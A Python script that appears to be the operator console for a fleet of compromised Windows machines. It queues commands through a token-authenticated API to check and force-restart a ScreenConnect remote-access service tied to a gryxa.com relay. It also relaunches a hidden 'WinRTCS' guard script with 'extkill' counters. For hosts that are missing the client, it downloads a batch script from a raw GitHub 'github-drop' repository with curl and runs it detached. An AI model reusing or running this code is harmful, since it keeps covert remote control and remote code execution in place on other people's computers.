#!/usr/bin/env python3
"""Pull R2 recover logs + retry start/guard on remaining bad hosts."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"

HOSTS = [
    "DESKTOP-3UFSG6P",
    "DESKTOP-L66QG8O",
    "MRG-DELL",
    "SECRETARYPC",
    "CUONGCHECKERS",
    "DESKTOP-L12E0G2",
    "IDGITPOE1959",
]

LOG = (
    r"if exist C:\Users\Public\gryxa_recover.log (powershell -NoP -NonI -C "
    "\"Get-Content C:\\Users\\Public\\gryxa_recover.log -Tail 35\") else (echo NO_LOG)"
    " & powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$n='ScreenConnect Client (36e506ff016b2151)'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq $n } | Select-Object -First 1; "
    "if(-not $s){'GRYXA=MISSING'} else {'GRYXA='+$s.State+'|PATH='+$s.PathName+'|START='+$s.StartMode}; "
    "$d86='C:\\Program Files (x86)\\ScreenConnect Client (36e506ff016b2151)'; "
    "$exe=Join-Path $d86 'ScreenConnect.ClientService.exe'; "
    "'DIR='+(Test-Path $d86); 'EXE='+(Test-Path $exe); "
    "if(Test-Path $exe){'EXE_SIZE='+(Get-Item $exe).Length}; "
    "Get-Service -Name 'ScreenConnect Client*' | ForEach-Object { "
    "Write-Output ('SC='+$_.Name+'|' + $_.Status) }\""
    " & echo DONE"
)

START = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='Continue'; "
    "$n='ScreenConnect Client (36e506ff016b2151)'; "
    "$d='C:\\Program Files (x86)\\ScreenConnect Client (36e506ff016b2151)\\ScreenConnect.ClientService.exe'; "
    "if(-not (Test-Path $d)){ $d='C:\\Program Files\\ScreenConnect Client (36e506ff016b2151)\\ScreenConnect.ClientService.exe' }; "
    "Write-Output ('EXE='+(Test-Path $d)); "
    "Set-Service -Name $n -StartupType Automatic; "
    "Start-Service -Name $n; Start-Sleep 4; "
    "$s=Get-Service -Name $n -EA SilentlyContinue; "
    "if($s){Write-Output ('AFTER='+$s.Status)} else {Write-Output 'AFTER=MISSING'}\""
    " & echo START_DONE"
)

GUARD = (
    r">C:\ProgramData\WinRTCS\extkill.cnt echo 0"
    r" & >C:\ProgramData\WinRTCS\guard.cnt echo 9999"
    r" & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15"
    r" & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd"
    r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
    " & echo GUARD_KICKED"
)

RECOVER = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER_QUEUED'
)

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g) "
    "}; Write-Output 'GRYXA_PROBE_DONE'\""
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.read().decode(errors="replace")


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_one(cid: int, timeout: float = 100.0) -> str:
    t0 = time.time()
    while time.time() - t0 < timeout:
        res = api_json(f"/api/cmd/{cid}").get("results") or []
        if res:
            time.sleep(3)
            res = api_json(f"/api/cmd/{cid}").get("results") or []
            return (res[0].get("out") if res else "") or ""
        time.sleep(5)
    return ""


def wait_all(cid: int, min_n: int = 85, timeout: float = 180.0) -> list[dict]:
    t0 = time.time()
    last = -1
    while time.time() - t0 < timeout:
        res = api_json(f"/api/cmd/{cid}").get("results") or []
        if len(res) != last:
            print(f"  cmd#{cid} results={len(res)}")
            last = len(res)
        if len(res) >= min_n and (time.time() - t0) >= 85:
            time.sleep(12)
            return api_json(f"/api/cmd/{cid}").get("results") or []
        time.sleep(8)
    return api_json(f"/api/cmd/{cid}").get("results") or []


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    lines = [f"=== LOGS2 {time.strftime('%Y-%m-%d %H:%M:%S')} ==="]
    status = {}
    for h in HOSTS:
        print("log", h)
        cid = queue(h, LOG)
        out = wait_one(cid)
        status[h] = out
        print(h, out[:500].replace("\n", " | "))
        lines.append(f"--- {h} ---")
        lines.append(out[:2000])
        lines.append("")

    for h, out in status.items():
        if re.search(r"GRYXA=Running", out, re.I):
            continue
        if "EXE=False" in out or "GRYXA=MISSING" in out or "EXE=False" in out:
            print("recover+guard", h)
            queue(h, RECOVER)
            time.sleep(0.2)
            queue(h, GUARD)
        elif re.search(r"GRYXA=Stopped", out, re.I) and "EXE=True" in out:
            print("start", h)
            queue(h, START)
        elif out.strip() == "":
            print("offline/no-result", h)
        else:
            print("guard", h)
            queue(h, GUARD)
        time.sleep(0.15)

    print("wait 240s")
    time.sleep(240)
    cid = queue("ALL", PROBE)
    results = wait_all(cid)
    buckets = {k: [] for k in ("RUNNING", "STOPPED", "MISSING", "NO_PARSE", "WRONG_PATH", "OTHER")}
    detail = {}
    for r in results:
        host = r.get("host") or "?"
        out = r.get("out") or ""
        detail[host] = out
        m = re.search(r"GRYXA=([A-Za-z_]+)", out)
        if not m:
            buckets["NO_PARSE"].append(host)
            continue
        st = m.group(1).upper()
        if st == "RUNNING":
            buckets["WRONG_PATH" if "PATH_GRYXA=NO" in out else "RUNNING"].append(host)
        elif st in ("STOPPED", "STOP_PENDING", "START_PENDING"):
            buckets["STOPPED"].append(host)
        elif st == "MISSING":
            buckets["MISSING"].append(host)
        else:
            buckets["OTHER"].append(host)

    lines.append(f"=== FINAL4 cmd=#{cid} n={len(results)} ===")
    for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        lines.append(f"{k}={len(buckets[k])}")
    for k in ("STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        if buckets[k]:
            lines.append(f"--- {k} ---")
            for h in sorted(buckets[k]):
                lines.append(f"  {h}")

    fleet = api_json("/api/fleet")
    counts = fleet.get("counts") or {}
    online_no = sorted(
        h["host"]
        for h in (fleet.get("hosts") or [])
        if h.get("presence") == "online" and not h.get("has_gryxa")
    )
    lines.append(f"SIGHT={counts}")
    lines.append(f"sight_online_no_gryxa={online_no}")

    report = "\n".join(lines) + "\n"
    prev = OUT.read_text(encoding="utf-8") if OUT.exists() else ""
    OUT.write_text(prev + "\n" + report, encoding="utf-8")
    print("\n".join(lines[-40:]))
    print("wrote", OUT)
    bad = buckets["STOPPED"] + buckets["MISSING"] + buckets["WRONG_PATH"]
    return 0 if not bad else 2


if __name__ == "__main__":
    raise SystemExit(main())
